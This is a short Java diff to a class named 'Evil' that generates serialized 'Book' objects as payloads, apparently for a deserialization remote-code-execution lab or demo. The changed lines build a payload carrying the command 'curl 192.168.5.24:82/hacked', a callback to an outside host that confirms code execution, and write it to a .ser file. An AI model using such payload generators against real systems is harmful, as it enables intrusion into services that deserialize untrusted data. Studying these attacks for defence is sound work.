@@ -24,7 +24,7 @@ public class Evil {
 	}
 
 	public static void createBookRceSetterPayload() throws IOException {
-		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked");
+		BookRceSetter myBook = new BookRceSetter("someTitle", "blub", "curl 192.168.5.24:82/hacked");
 		String myBookSerialized = serializeBook(myBook);
 
 		FileWriter fileWriter = new FileWriter("naughty_BookRceSetter.ser");
@@ -33,7 +33,7 @@ public class Evil {
 		printWriter.close();
 	}
 
-    public static String serializeBook(BookRceReadObject myBook) {
+    public static String serializeBook(Object myBook) {
 		ByteArrayOutputStream baos = null;
 
 		try {
